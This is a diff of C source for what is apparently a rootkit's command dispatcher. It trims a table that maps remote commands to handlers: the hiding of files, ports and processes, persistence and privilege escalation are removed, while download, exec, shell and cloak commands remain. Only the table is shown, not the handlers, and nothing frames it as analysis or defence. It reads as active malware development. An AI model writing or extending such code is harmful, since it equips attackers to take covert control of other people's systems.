@@ -9,28 +9,16 @@ struct rk_dispatch_entry {
 	rk_handler_t	handler;
 };
 
-// Longer prefixes first so "UNHIDE FILE" matches before "HIDE FILE".
+// Longer prefixes first so greedy match works correctly.
 static const struct rk_dispatch_entry dispatch_table[] = {
-	{ "UNHIDE CONTENT ", 15, cmd_unhide_content },
-	{ "HIDE CONTENT ",   13, cmd_hide_content   },
-	{ "UNHIDE FILE ",    12, cmd_unhide_file    },
-	{ "UNHIDE PORT ",    12, cmd_unhide_port    },
-	{ "UNHIDE PID ",     11, cmd_unhide_pid     },
-	{ "HIDE FILE ",      10, cmd_hide_file      },
-	{ "HIDE PORT ",      10, cmd_hide_port      },
-	{ "HIDE PID ",        9, cmd_hide_pid       },
-	{ "DOWNLOAD ",        9, cmd_download       },
-	{ "EXEC ",            5, cmd_exec           },
-	{ "LIST ",            5, cmd_list           },
-	{ "UNPERSIST",        9, cmd_unpersist      },
-	{ "UNCLOAK",          7, cmd_uncloak        },
-	{ "ESCALATE",         8, cmd_escalate       },
-	{ "PERSIST",          7, cmd_persist        },
-	{ "STATUS",           6, cmd_status         },
-	{ "SHELL",            5, cmd_shell          },
-	{ "CLOAK",            5, cmd_cloak          },
-	{ "PING",             4, cmd_ping           },
-	{ "INFO",             4, cmd_info           },
+	{ "DOWNLOAD ",  9, cmd_download },
+	{ "EXEC ",      5, cmd_exec     },
+	{ "UNCLOAK",    7, cmd_uncloak  },
+	{ "STATUS",     6, cmd_status   },
+	{ "SHELL",      5, cmd_shell    },
+	{ "CLOAK",      5, cmd_cloak    },
+	{ "PING",       4, cmd_ping     },
+	{ "INFO",       4, cmd_info     },
 };
 
 static size_t strip_trailing(const u8 *buf, size_t len)
